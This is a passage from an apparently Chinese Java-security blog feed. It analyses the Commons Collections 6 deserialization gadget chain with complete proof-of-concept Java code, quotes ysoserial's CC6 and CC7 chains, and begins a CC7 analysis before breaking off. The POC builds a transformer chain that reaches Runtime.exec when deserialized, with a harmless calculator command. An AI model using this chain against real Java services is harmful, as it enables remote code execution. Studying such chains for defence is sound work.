class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/11/10/CommonsCollections6/image-20221008153450633.png" alt="image-20221008153450633"></p><p>除了<code>outerMap.remove()</code>删除键值对，我们还可以通过替换 key 的方式进行处理。</p><p><code>HashMap</code>将键值对存储在了<code>Node&lt;K,V&gt;[] table</code>中，并封装在<code>Node</code>对象里，其中<code>Node</code>是<code>HashMap</code>内部的静态类<br><img src="/2021/11/10/CommonsCollections6/image-20221008161018495.png" alt="image-20221008161018495"></p><p>因此我们首先需要通过反射获取到<code>table</code>字段，然后因为我们没有获取到<code>Node</code>类，所以之类需要转换为<code>Object</code>类型。最后取到数组中的 key 进行替换<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取table</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) table.get(expMap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="type">Field</span> <span class="variable">expMapKey</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        expMapKey.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        expMapKey.set(node, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><strong>坑点！！！</strong></p><p>如果有同学将 key 取值成<code>keyTest</code>，而不是<code>aaa</code>时，会发现报错为空<br><img src="/2021/11/10/CommonsCollections6/image-20221008174729245.png" alt="image-20221008174729245"></p><p>调试了一下，发现如果<code>key</code>为<code>keyTest</code>字符串时，变成了<code>array[4]</code>才能取到我们前面设置的值。<br><img src="/2021/11/10/CommonsCollections6/image-20221008174748438.png" alt="image-20221008174748438"></p><p>这是为什么呢？继续怀着好奇心调试，发现问题还是在 put 上，可以看到这里对<code>key</code>传进了<code>hash()</code>方法中进行运算<br><img src="/2021/11/10/CommonsCollections6/image-20221008174930212.png" alt="image-20221008174930212"></p><p><img src="/2021/11/10/CommonsCollections6/image-20221008180314692.png" alt="image-20221008180314692"></p><p>因此 key 为<code>aaa</code>和<code>keyTest</code>的值完全不同，导致了最后 i 分别为 0 和 4<br><img src="/2021/11/10/CommonsCollections6/image-20221008175056295.png" alt="image-20221008175056295"></p><p><img src="/2021/11/10/CommonsCollections6/image-20221008175106525.png" alt="image-20221008175106525"></p><p>因此修改最终 POC为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;keyTest&quot;</span>;</span><br><span class="line">        expMap.put(key ,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取table</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) table.get(expMap);</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[((h=key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>)) &amp; (array.length -<span class="number">1</span>)];</span><br><span class="line">        <span class="type">Field</span> <span class="variable">expMapKey</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        expMapKey.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        expMapKey.set(node, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="/2021/11/10/CommonsCollections6/image-20221008180530399.png" alt="image-20221008180530399"></p><h2 id="ysoserial的做法"><a href="#ysoserial的做法" class="headerlink" title="ysoserial的做法"></a>ysoserial的做法</h2><p>接着看看<code>ysoserial</code>的实现，给出的利用链为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>对比前面的，可以发现<code>ysoserial</code>采用的是<code>HashSet</code>，在<code>HashSet#readObject()</code>方法中最后会调用到<code>HashMap#put()</code><br><img src="/2021/11/10/CommonsCollections6/image-20221009103459255.png" alt="image-20221009103459255"></p><p>而通过前面的分析，我们知道<code>HashMap#put()</code>最终也会调用到<code>hashCode()</code>方法，这里就不赘述了。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections7利用链分析</title>
      <link href="/2021/11/10/CommonsCollections7/"/>
      <url>/2021/11/10/CommonsCollections7/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections7利用链分析"><a href="#CommonsCollections7利用链分析" class="headerlink" title="CommonsCollections7利用链分析"></a>CommonsCollections7利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>终于迎来最后一条链子<code>CommonsCollections7</code>，利用条件如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本未知限制</span><br></pre></td></tr></table></figure></p><p>先看<code>ysoserial</code>给出的利用链<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Payload method chain:</span><br><span class="line"></span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br></pre></td></tr></table></figure></p><p>可以看到从<code>LazyMap#get()</code>起后面的都是<code>CommonsCollections1</code>的内容，前面则是新知识点，也是一条寻找了其他能触发<code>LazyMap#get()</code>方法的链子</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>根据 gadget 先跟进<code>Hashtable#readObject()</code>方法源码<br><img src="/2021/11/10/CommonsCollections7/image-20221011152526177.png" alt="image-20221011152526177"></p><p>其中<code>s</code>是我们传入的输入流，分别通过<code>readObject()</code>进行反序列化赋值给<code>key</code>以及<code>value</code>，接着调用<code>reconstitutionPut()</code>方法，继续跟进<br><img src="/2021/11/10/CommonsCollections7/image-20221011152715640.png" alt="image-20221011152715640"></p><p>在<code>reconstitutionPut()</code>方法中，调用了<code>key.equals()</code>方法，这里我们知道<code>key</code>是可控的，根据调用链看，最终是调用了<code>AbstractMap#equals()</code>，我们继续跟进<code>AbstractMap</code>类的<code>equals()</code>方法<br><img src="/2021/11/10/CommonsCollections7/image-20221011153118215.png" 